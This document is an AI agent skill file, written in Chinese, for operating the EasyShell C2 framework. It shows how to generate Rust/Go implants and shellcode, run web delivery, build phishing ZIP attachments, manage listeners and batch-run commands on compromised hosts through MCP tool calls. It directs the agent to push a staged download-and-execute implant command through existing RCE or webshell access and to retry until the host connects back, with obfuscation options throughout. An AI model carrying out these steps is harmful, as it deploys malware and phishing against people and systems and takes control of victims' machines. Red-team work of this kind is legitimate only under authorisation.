---
name: easyshell-payload
description: >-
  EasyShell 载荷生成与投递：GenServer 客户端生成、WebDelivery、Shellcode、
  钓鱼载荷附件。用户生成植入体、配置 Web 投递或钓鱼 ZIP 附件时使用。
---

# easyshell-payload: 载荷生成与投递

> **核心逻辑：** 先有监听器 → 选投递方式 → 目标执行后切 [[easyshell-real]]

---

## 零之前：已经有执行能力时，走「一键上线」而不是投递

**判断口径只有一句：我们能在目标上执行命令 → 一键上线；不能 → 才谈投递。**

已经有 RCE / 命令注入 / webshell / 已上线植入体时，不要生成文件再想办法上传，
也不要开 Web 投递：

1. `easyshell_list_listeners()` 确认有 open 的监听器，记下 `protocol://connectAddress`；
2. 在 TeamServer 控制台对该监听器开「一键上线」，拿到那一条上线命令（分阶段下载并执行的一行命令）；
3. 把这条命令**直接在目标上执行**（走已有的 `easyshell_exec_cmd` / webshell / RCE 通道）；
4. `easyshell_list_clients(online_only=True)` 轮询确认上线。

**一键上线有窗口期**：默认是临时开放的分阶段下载路径，过时即失效。

- 能动 TeamServer 系统设置时：打开「监听器一键上线（永久）」，让下载路径长期有效；
- 动不了设置时：**临时开启并让它一直运行到上线为止** —— 开窗后立刻执行命令，
  窗口内反复 `easyshell_list_clients` 确认；没上线就**重新开窗再试**，不要只发一次就判定失败；
  确认上线（或确认放弃）后再按需关闭，别把下载路径长期裸奔。

下面第二～四节的「文件投递 / Web 投递 / 钓鱼附件」都是**目标没有执行能力**时的下策。

---

## 零、前置条件

```
1. easyshell_list_listeners() — 确认监听器已 open
2. 记录 listener 字符串：protocol://connectAddress（如 websocket://c2.example.com:443）
3. 可选 pass：植入体连接密码
```

| 投递方式 | 适用场景 | MCP 工具 |
|----------|----------|----------|
| **一键上线（首选）** | **已在目标上有命令执行能力** | TeamServer 控制台开「一键上线」→ 命令直接在目标执行 |
| 客户端生成 PE/ELF | 手工投递、U 盘 | `easyshell_gen_payload` |
| Web 投递 | 目标自己下载（无执行能力时） | `easyshell_start_webdelivery` |
| Shellcode | 注入/加载器 | `easyshell_gen_shellcode` |
| 钓鱼 ZIP 附件 | 邮件演练 | `easyshell_gophish_build_attachment` |

---

## 一、客户端生成（GenServer）

Web：**客户端生成** `/Server`

```python
easyshell_gen_payload(
    os_type="windows",
    arch_type="amd64",
    listener="websocket://your-c2:443",
    output_path="C:/temp/agent.exe",
    pass_phrase="",
    implant_lang="rust",   # rust | go（go 仅 windows）
    legacy_upx=False,
)
```

| 参数 | 说明 |
|------|------|
| os_type | windows / linux / darwin |
| arch_type | amd64 / 386 / arm64 |
| implant_lang | rust（默认，跨平台）/ go（仅 Windows） |
| legacy_upx | UPX 体积压缩（可能增加查杀特征） |

生成物为已 patch 监听器地址的植入体，可直接投递。

---

## 二、Web 投递（目标没有执行能力时才用）

> 已经有命令执行能力时**不要**走这条路：它要额外占一个 TeamServer 端口、还要开匿名下载窗口，
> 比「一键上线」多两个环节。只有必须让目标自己下载时才用。

Web：**监听管理 → Web 投递** `/Listeners`

### 2.1 启动

```python
easyshell_start_webdelivery(
    listener="websocket://your-c2:443",
    os_name="windows",
    arch="amd64",
    port="8088",           # TeamServer 上新端口，勿与主端口冲突
    filename="",           # 可空，自动默认名
    pass_phrase="",
    use_sgn=False,
)
# 返回下载 URL，发给目标浏览器/curl 即可
```

### 2.2 管理与临时匿名下载

```python
easyshell_list_webdelivery()

# 临时开放匿名下载（默认 15 分钟，防扫描）
easyshell_webdelivery_control("temp-unlock", "8088")

# 停止 / 删除
easyshell_webdelivery_control("close", "8088")
easyshell_webdelivery_control("delete", "8088")
```

**注意：**
- Web 投递端口在 **TeamServer** 上监听，下载流量不经植入体。
- 分阶段 stage 模式需配合 `stage2_filename`；MCP 简版用默认即可，复杂配置走 Web。
- 系统设置可开「监听器一键上线（永久）」长期开放分阶段下载路径；**能开就开**，
  省掉每次开窗 / 重新开窗的来回。

---

## 三、Shellcode 生成

Web：**客户端生成** 或监听器右键导出

```python
easyshell_gen_shellcode(
    listener="websocket://your-c2:443",
    output_path="./stageless.bin",
    os_type="windows",
    arch_type="amd64",
    pass_phrase="",
    use_sgn=False,   # SGN 混淆，体积变化
)
```

**Stage 分阶段 shellcode：** Web 端按 Web 投递端口或监听器导出；MCP 当前封装 stageless。Stage 一阶段 + WebDelivery 二阶段见 Web `/Server` 与 `/Listeners`。

---

## 四、钓鱼载荷附件

与 [[easyshell-phishing]] 联动，在邮件模板中挂 ZIP：

```python
# 1. 确认钓鱼模块
easyshell_gophish_status()

# 2. 生成 ZIP 附件
easyshell_gophish_build_attachment(
    listener="websocket://your-c2:443",
    os_type="windows",
    arch_type="amd64",
    payload_type="stage_pe",   # stageless | stage_pe
    zip_password="可选",
    output_path="./update.zip",
)
```

Web 模板编辑器也可「一键生成载荷附件」写入模板，无需手动保存文件。

**链路：** 模板附件 → 活动发出 → 监听器收线 → [[easyshell-real]]

---

## 五、监听器快捷操作

```python
easyshell_add_listener("websocket", "0.0.0.0:8443", "c2.example.com:8443")
easyshell_listener_control("open", "0.0.0.0:8443")
easyshell_list_listeners()
```

监听器类型：websocket、tcp、kcp、http-beacon、https-beacon、dns、doh、oss。

---

## 六、多机批量（分组）

```python
# 查看分组
easyshell_list_client_groups()

# 归入分组（Web /Clients 拓扑同数据源）
easyshell_set_client_group(uid, "dmz")

# 对多台执行相同命令（并发≤5，遵守猥琐发育）
easyshell_batch_exec("uid1,uid2,uid3", 'cmd /c "whoami&hostname"')
```

---

## 七、仅 Web 支持的能力

以下 **无 MCP 封装**（或只有部分封装），须用 Web 控制台：

| 能力 | Web 入口 | MCP |
|------|----------|-----|
| 屏幕键鼠实时 / 录屏流 | /client/screen（WS 流） | —（实时流不可轮询） |
| 屏幕单次截屏 / 截屏历史 | /client/screen（REST） | ✅ `screen_capture` / `screen_history*` |
| HVNC 隐藏桌面 | 客户端菜单 | — |
| 交互 WebSocket 终端 | /client/shell（WS 模式） | — |
| Stage 分阶段 shellcode 向导 | /Server、监听器右键 | — |
| 系统设置 / 数据库 / 审计 | /System | — |
| 用户账号管理 | 系统设置内 | — |

屏幕/HVNC 实时画面为 WebSocket 流，MCP 轮询 `exec_cmd` 无法替代；
但**单次截屏**是同步 REST（`GET /client/screen/capture`），MCP 已封装——截屏存本机图片后可直接在对话中展示，完整用法见 [[easyshell-real]]。

---

## 八、操作原则

### ✅ 正确

```
1. 生成前先 list_listeners 确认监听器在线
2. 已在目标上有执行能力 → 开「一键上线」把命令直接执行，不要走 Web 投递
3. 一键上线有窗口期：开不了「永久」就临时开启并持续运行到上线，没上线就重新开窗
4. Web 投递先 temp-unlock 再发链接，用完 close
5. 钓鱼附件与活动使用同一监听器
6. 批量命令并发≤5，合并单条 cmd
7. 生成文件勿提交 git
```

### ❌ 错误

```
1. 监听器未 open 就 gen_payload
2. 明明能执行命令，却绕去开 Web 投递端口 / 生成文件再想办法上传
3. 一键上线只发一次命令、没确认上线就判定失败（窗口期没过完就放弃）
4. Web 投递端口与 TeamServer 主端口冲突
5. 对未授权目标批量投递
6. 把 GenServer 输出路径写在植入体磁盘上（应保存到操作员本机）
```

---

## 九、关联 Skills

- [[easyshell-phishing]] — 邮件活动与模板
- [[easyshell-real]] — 上线后 C2 操作
- [[easyshell-mcp]] — 全部 MCP 工具映射
- [[easyshell-pentest]] — 全链路渗透
